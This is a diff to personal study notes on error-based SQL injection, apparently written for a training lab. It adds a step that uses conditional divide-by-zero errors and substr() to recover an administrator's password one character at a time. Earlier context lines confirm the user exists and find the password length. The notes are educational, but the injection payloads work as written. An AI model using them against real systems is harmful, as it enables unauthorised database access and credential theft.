@@ -199,5 +199,7 @@ Theory:-  Error-based SQL injection refers to cases where you're able to use err
     5. '  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator') || ' -> gives internal error means condition is true and user administrator exists
     6. '  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator' and LENGTH(password)>8) || ' -> gives internal error means password length is greater than 8
     password length is 20 cus after that response is coming 200
+    7. ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator' and substr(password,1,1)='a')  || '
+    and keep swtiching position and perform $a$ and in (1,1) keep changing the first 1 value till 20 until we recover full password length.
 
-    6. ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator' and substr(password,1,1)='a')  || '
+------------------------------------------------------------------------------------------
